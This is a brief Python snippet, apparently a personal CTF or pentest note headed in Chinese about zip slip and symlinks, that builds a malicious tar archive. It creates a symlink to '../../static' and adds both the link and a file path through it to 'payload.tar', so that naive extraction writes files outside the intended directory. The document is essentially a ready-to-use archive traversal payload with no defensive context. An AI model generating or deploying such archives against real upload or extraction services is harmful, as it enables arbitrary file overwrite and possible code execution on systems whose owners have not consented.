zip→zipslip  压缩文件 软链接 

from tarfile import TarFile
import subprocess

subprocess.run(["ln", "-s", "../../static", "link"])

with TarFile("payload.tar", "w") as tarf:
    tarf.add("link")
    tarf.add("link", "link/test.txt")
